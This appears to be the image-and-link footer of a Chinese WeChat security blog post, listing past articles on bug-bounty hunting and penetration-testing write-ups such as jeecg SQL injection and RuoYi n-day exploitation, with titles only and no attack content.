![](https://mmbiz.qpic.cn/mmbiz_jpg/mcko8AHj6QV9grs7NOhSTCfTpCc4xrxdnlISIReNNCKR2EOyWvhMpyIzbma8nuelSg8LicKF5yYZ7hgyODlWgMmhViaE8Ahhs7PZlnmA0VFcY/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[手把手js逆向断点调试&js逆向前端加密对抗&企业SRC实战分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247495361&idx=1&sn=48283073b325e360823da8dec27a7508&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[浅谈src漏洞挖掘中容易出洞的几种姿势](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247489731&idx=1&sn=c3a5ef01648fad496ecda36b653b6e21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[HVV护网行动 | 分享最近攻防演练HVV漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247488672&idx=1&sn=493bb70011a02eb971ff1b74c733f1d9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[JS漏洞挖掘｜分享使用FindSomething联动的挖掘思路](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492315&idx=1&sn=88991e98058a277e267a9a79b8518e16&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493292&idx=1&sn=611fd43361089a30e5f7bcda21274b95&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[分享SRC中后台登录处站点的漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247485439&idx=1&sn=3fd7e4cef57edca8e73104f8af38fc05&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[企业SRC支付漏洞&EDUSRC&众测挖掘思路技巧操作分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492839&idx=1&sn=b9781f60580c1da8e2151166f0494ba5&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 分享某次项目上的渗透测试漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493495&idx=1&sn=791bebc6faa651cc3c585c2f5f481d21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】分享云安全浪潮src漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494877&idx=1&sn=2d00c0f651fd7375e881be86638e53ce&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[实战SRC挖掘｜微信小程序渗透漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494468&idx=1&sn=f0da4b4ff7763cbb83b858fb5a8964f9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[综合资产测绘 | 手把手带你搞定信息收集](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493749&idx=1&sn=d2e0febcdcf9dcd8aa44be0d43b51936&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】针对若依系统nday的常见各种姿势利用](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac&scene=21#wechat_redirect)  
  
  
  
